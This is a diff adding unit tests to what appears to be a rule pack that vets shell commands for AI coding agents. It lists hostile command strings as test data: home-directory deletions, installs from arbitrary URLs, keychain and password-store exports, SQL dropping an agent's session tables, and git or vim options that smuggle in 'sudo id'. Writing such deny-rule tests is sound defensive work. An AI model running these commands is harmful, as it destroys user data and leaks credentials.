@@ -2838,6 +2838,24 @@ class CodingPack(unittest.TestCase):
             "rm -rf ~/.cache", "rm -rf ./.*", "find ~ -name '*.log' -delete", "find ~ -size +100M -delete",
             "find ~ -regex '.*\\.tmp' -delete", "find ~/proj -name '*' -delete"))
 
+    def test_direct_references_whole_store_exports_and_a_write_to_opencodes_database_are_denied(self):
+        # the 1.5.3 sweep: a PEP 508 direct reference, an upper-case scheme, npm's github: shorthand, `security
+        # export`, `gopass grep` and sqlite3 deleting OpenCode's sessions were allowed or only held
+        self.every_pack_verdicts([(c, "TK-D021") for c in (
+            "pip install 'p @ https://x.example/p.whl'", "pip install p@https://x.example/p.whl",
+            "pip install HTTPS://x.example/p.whl", "npm install github:evil/pkg")] + [(c, "TK-D020") for c in (
+            "security export -k login.keychain -t identities -f pkcs12 -o x.p12", "security export -k login.keychain",
+            "gopass grep x")] + [(c, "TK-D008") for c in (
+            "sqlite3 ~/.local/share/opencode/opencode.db 'DELETE FROM message'",
+            "sqlite3 ~/.local/share/opencode/opencode.db <<'EOF'\nDROP TABLE session;\nEOF")])
+        self.not_in_every_pack("TK-D021", ("pip install 'requests>=2'", "npm install @scope/pkg", "npm install pkg@1.2.3"))
+        self.not_in_every_pack("TK-D020", (
+            "security export -k /System/Library/Keychains/SystemRootCertificates.keychain -t certs -f pemseq -o b.pem",
+            "gopass ls"))
+        self.not_in_every_pack("TK-D008", (
+            "sqlite3 ~/.local/share/opencode/opencode.db 'SELECT * FROM message'",
+            "sqlite3 ~/.local/share/opencode/opencode.db \"SELECT * FROM message WHERE text LIKE '%delete%'\""))
+
     def test_infrastructure_removal_benign_commands_are_allowed(self):
         for command in (
             "cdk diff",
@@ -3009,6 +3027,14 @@ class PackReading(unittest.TestCase):
             "git -c filter.a.clean='sudo id' add .", "git -c core.gitproxy='sudo id' fetch",
             "git -c gpg.program='sudo id' commit -S -m x", "git -c sequence.editor='sudo id' rebase -i HEAD~2",
             "vim -c ':!sudo id'", "vim +'r !id'")], "deny")
+
+    def test_a_pgp_private_key_block_is_a_secret(self):
+        # the 1.5.3 sweep: OpenPGP armour ends its header in KEY BLOCK
+        armour = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
+        self.rule_on_server("TK-S003", [("Bash", {"command": f"echo '{armour}' > k"})])
+        self.rule_on_server("TK-S002", [("mcp:notes/save", {"text": armour})])
+        self.rule_on_server("TK-S003", [("Bash", {"command": "echo '-----BEGIN PGP PUBLIC KEY BLOCK-----' > k"})],
+                            want=False)
 
     def test_ssh_keywords_in_any_case_command_keys_of_git_and_more_vim_and_man_forms_run_a_program(self):
         """The 1.5.3 sweep: ssh reads its keywords in any case; KnownHostsCommand, scp's and sftp's -o and -S, rsync's
